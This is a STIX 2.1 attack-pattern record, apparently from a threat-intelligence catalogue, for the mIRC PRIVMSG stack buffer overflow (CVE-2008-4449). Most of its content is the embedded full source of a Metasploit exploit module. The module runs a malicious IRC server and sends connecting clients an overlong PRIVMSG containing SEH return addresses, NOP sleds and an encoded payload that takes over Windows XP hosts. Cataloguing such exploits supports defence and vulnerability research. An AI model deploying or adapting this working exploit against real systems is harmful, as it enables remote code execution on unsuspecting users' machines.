{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d0eda87-a514-46e9-b712-c0b385674f4c",
    "created": "2024-08-14T16:46:08.996172Z",
    "modified": "2024-08-14T16:46:08.996176Z",
    "name": "mIRC PRIVMSG Handling Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow in the mIRC IRC Client v6.34 and earlier. By enticing a mIRC user to connect to this server module, an excessively long PRIVMSG command can be sent, overwriting the stack. Due to size restrictions, ordinal payloads may be necessary. This module is based on the code by SkD. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/mirc_privmsg_server.rb",
            "external_id": "mirc_privmsg_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4449"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'mIRC PRIVMSG Handling Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the mIRC IRC Client v6.34 and earlier.\n        By enticing a mIRC user to connect to this server module, an excessively long PRIVMSG\n        command can be sent, overwriting the stack. Due to size restrictions, ordinal payloads\n        may be necessary. This module is based on the code by SkD.\n      },\n      'Author' \t => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-4449' ],\n          [ 'OSVDB', '48752' ],\n          [ 'BID', '31552' ],\n          [ 'EDB', '6666' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 160,\n          'BadChars' => \"\\x00\\x07\\x0a\\x0b\\x0c\\x0d\\x20\\x21\\x22\\x23\\x24\\x25\\x27\\x2a\\x2c\\x2e\\x2f\\x3a\\x3b\\x3c\\x3e\\x3f\\x40\\x7b\\x7c\\x7d\", # This is mostly a guess plus some RFC info.\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n        # Patrick - Tested against xpsp3 ok 20090715\n          [ 'Windows XP SP3', \t{ 'Rets' => [\n                  0x7792FBD1, # SETUPAPI.DLL pop eax pop ret\n                  0x7FFDB5B5,\n                  0x779D87B7, # SETUPAPI.DLL 0x779D87B7 jmp esp\n          ] } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-10-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The IRC server port to listen on\", 6667 ]),\n        OptString.new('SRVNAME', [ true, \"Welcome to the ... IRC Server Name\", \"Internet Relay Network\" ]),\n      ])\n  end\n\n  def on_client_connect(client)\n    return unless regenerate_payload(client)\n    print_status(\"Client connected! Sending payload...\")\n    buffer = \":my_irc_server.com 001 wow :Welcome to the #{datastore['SRVNAME']} wow\\r\\n\"\n    client.put(buffer)\n  end\n\n  def on_client_data(client)\n    client.get_once\n    select(nil,nil,nil,2)\n    sploit = \":\" + Rex::Text.rand_text_alphanumeric(307) + [target['Rets'][0]].pack('V') + [target['Rets'][1]].pack('V')\n    sploit << make_nops(4) + [target['Rets'][2]].pack('V') + make_nops(4) + \"B\" * 12\n    sploit << Rex::Arch::X86.jmp_short(3) +Rex::Text.rand_text_alphanumeric(2)\n    sploit << make_nops(4) + payload.encoded + make_nops(4) + \" PRIVMSG  wow : /FINGER wow\\r\\n\"\n    client.put(sploit)\n\n    handler(client)\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-02",
    "x_mitre_platforms": [
        "win'"
    ]
}